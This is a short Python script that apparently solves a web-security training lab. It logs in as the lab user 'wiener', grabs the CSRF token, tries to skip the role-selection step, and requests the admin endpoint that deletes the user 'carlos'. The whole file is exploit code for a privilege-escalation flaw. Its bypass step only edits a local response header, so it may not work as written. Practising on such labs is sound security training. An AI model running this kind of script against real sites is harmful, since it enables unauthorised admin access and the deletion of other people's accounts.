import re
import sys
import requests

if __name__ == "__main__":
    if len(sys.argv) != 2:
        print("Usage: python script.py <url>")
        sys.exit(1)

burp_url = sys.argv[1]
login_url = burp_url + '/login'
session = requests.Session()
response = session.get(login_url)
csrf_token_match = re.search(r'<input required type="hidden" name="csrf" value="([^"]+)"', response.text)
csrf = csrf_token_match.group(1)

burp_data = {"csrf": csrf, "username": "wiener", "password": "peter"}
r = session.post(login_url, data=burp_data,allow_redirects=False)

if r.headers['Location'] == '/role-selector':
    r.headers['Location'] = '/admin'

session.get(burp_url+'/admin/delete?username=carlos')
